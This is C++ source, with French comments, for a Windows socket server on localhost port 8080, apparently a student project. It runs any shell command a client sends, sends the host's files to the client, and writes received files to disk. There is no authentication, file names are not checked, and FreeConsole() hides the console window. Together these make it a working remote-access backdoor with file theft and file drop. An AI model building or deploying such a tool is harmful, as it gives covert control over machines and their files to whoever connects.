#include <iostream>
#include <string>
#include <vector>
#include <filesystem>
#include <fstream>


#include "SocketServeur.h"
#include "SocketClient.h"
#include "Commande.h"
#include "Dialogue.h"

using namespace std;

int ActiviClient(SocketClient client)
{
    // initialisation des variables
    string commande = "";
    string repertoireActuel = ""; // permet de garder en memoire le repertoire courant du client

    Commande commandSystem; // permet d'executer les commandes du systeme
    Dialogue dialogue; // permet de traiter les entetes
    bool deconnection = false; // permet de savoir si le client est deconnecte

    while (!deconnection)
    {

        //RECEPTION du message du client
        string reponse = client.Receive();
        if (reponse.empty())
        {
            cerr << "Echec pour la reception des datas du client" << endl;
            return -1;
        }

        //methode pour traiter les entetes 
        vector<string> entete = dialogue.DecodageEntete(reponse);
        string reponseServeur = "";
        if (entete[0] == "COMMANDE")
        {

            reponseServeur = commandSystem.ExecCommand(entete[1], repertoireActuel);

            stringstream streamTexte(reponseServeur);
            string line = "";

            while (getline(streamTexte, line))
            {
                repertoireActuel = line;
            }
            //cout << "repertoire actuel : " << repertoireActuel << endl;
            if (!client.Send(reponseServeur))
            {
                cerr << "Echec de l'envoie des donnees" << endl;
                return -1;
            }

        }
        else if (entete[0] == "TELECHARGER")
        {

            string cheminFichier = repertoireActuel + '\\' + entete[1];
            ifstream fileIn(cheminFichier, ios::binary);

            //ouverture en mode binaire 
            if (!fileIn.is_open())
            {
                cerr << "Erreur: impossible d'ouvrir le fichier " << entete[1] << endl;
            }

            vector<unsigned char>fichierBytes((istreambuf_iterator<char>(fileIn)), istreambuf_iterator<char>());
            //iterateur permettant de parcourir le fichier à lire et de remplir le vecteur 
            fileIn.close();

            string stringifBinaire(fichierBytes.begin(), fichierBytes.end());
            string tailleFichier = to_string(stringifBinaire.size());
            reponseServeur = entete[1] + "\\" + tailleFichier + "\\";
            cout << reponseServeur << endl;

            if (!client.Send(reponseServeur))
            {
                cerr << "Echec de l'envoie des donnees" << endl;
                return -1;
            }

            if (!client.Send(stringifBinaire))
            {
                cerr << "Echec de l'envoie des donnees" << endl;
                return -1;
            }


        }
        else if (entete[0] == "CHARGEMENT")
        {
            string nomfichier = entete[1];
            string tailleFichier = entete[2];
            int tailleFichierRecp = stoi(tailleFichier);

            cout << "taille recu de fichier : " << tailleFichier << endl;
            cout << "nom du fichier : " << nomfichier << endl;

            char* buffer = new char[tailleFichierRecp];
            int bytesRecus = 0;
            while (bytesRecus < tailleFichierRecp)//incremente des bytes jusqua la taille total du fichier
            {
                //decrementation de la taille totale restant a receptionner 
                //incrementation de la position sur le buffer. permet de le remplir  
                int result = client.ReceivFichier(buffer, bytesRecus, tailleFichierRecp);
                if (result == -1)
                {
                    cerr << "Erreur lors de la reception du fichier : " << WSAGetLastError() << endl;
                    client.~SocketClient();

                    return 1;
                }
                bytesRecus += result;//incrementation
            }
            cout << "Bytes recus : " << bytesRecus << endl;

            string cheminFichier = repertoireActuel + '\\' + nomfichier;

            ofstream fichier(cheminFichier, ios::out | ios::binary);
            if (fichier)
            {
                fichier.write(buffer, tailleFichierRecp);
                fichier.close();
                cout << "Fichier telecharge avec succes !" << endl;
            }
            else
            {
                cerr << "Erreur lors de l'ouverture du fichier" << endl;
                client.~SocketClient();
                delete[] buffer;
                return 1;
            }
            delete[] buffer;

            string reponseOk = "fichier charge Ok";
            if (!client.Send(reponseOk))
            {
                cerr << "Echec de l'envoie des donnees" << endl;
                return -1;
            }
        }
        else if (entete[0] == "DECONNECTION")
        {
            reponseServeur = "DECONNECTIONOK";

            if (!client.Send(reponseServeur))
            {
                cerr << "Echec de l'envoie des donnees" << endl;
                return -1;
            }

            deconnection = true;
        }
        else
        {
            cerr << "Erreur dans l'entete" << endl;
            reponseServeur = "Erreur dans l'entete";
            if (!client.Send(reponseServeur))
            {
                cerr << "Echec de l'envoie des donnees" << endl;
                return -1;
            }
        }

    }
    cout << "Deconnection du client" << endl;
    client.~SocketClient();
    return 0;
}

int main()
{

    // suite au probleme de build et run je suis passé par freeconsole() pour cacher le rendu de la console

    FreeConsole(); //permet de cacher la console mais ne permet pas d'enlever la fenetre de commande

    //la localisation du serveur est codé en dur. Dans la réalité il ne devrait pas bouger.
    //Sachant que le IP utilisé est valable sur toutes les machines pour le test. 

    const string ip_address = "127.0.0.1";
    const int port = 8080;

    ////////////////////////////////////////
    ////////////////////////////////////////
    //creation du socket serveur et mise a l'ecoute du port
    cout << "Creation du socket serveur" << endl;
    SocketServeur server(ip_address, port);
    // appel de la methode listen du socket serveur
    if (!server.Listen())
    {
        cerr << "Echec pour le début de l'écoute" << endl;
        return 1;
    }
    //cout << "Serveur debute l'ecoute : " << ip_address << " | port : " << port << endl;


    ////////////////////////////////////////////
    //acceptation puis creation du socket client
    //isolement du client dans la methode ActiviClient
    //utilisation d'une boucle while pour mettre le serveur en attente de connexion
    bool serveur = false;
    while (!serveur)
    {
        //acceptation du client et creation du socket client
        SOCKET client_socket = server.Accept();
        if (client_socket == INVALID_SOCKET)
        {
            cerr << "Echec de l'acceptation de la connection du client" << endl;
            return 1;
        }
        SocketClient client(client_socket);
        ActiviClient(client);
    }

    ////////////////////////////////////////////

    return 0;
}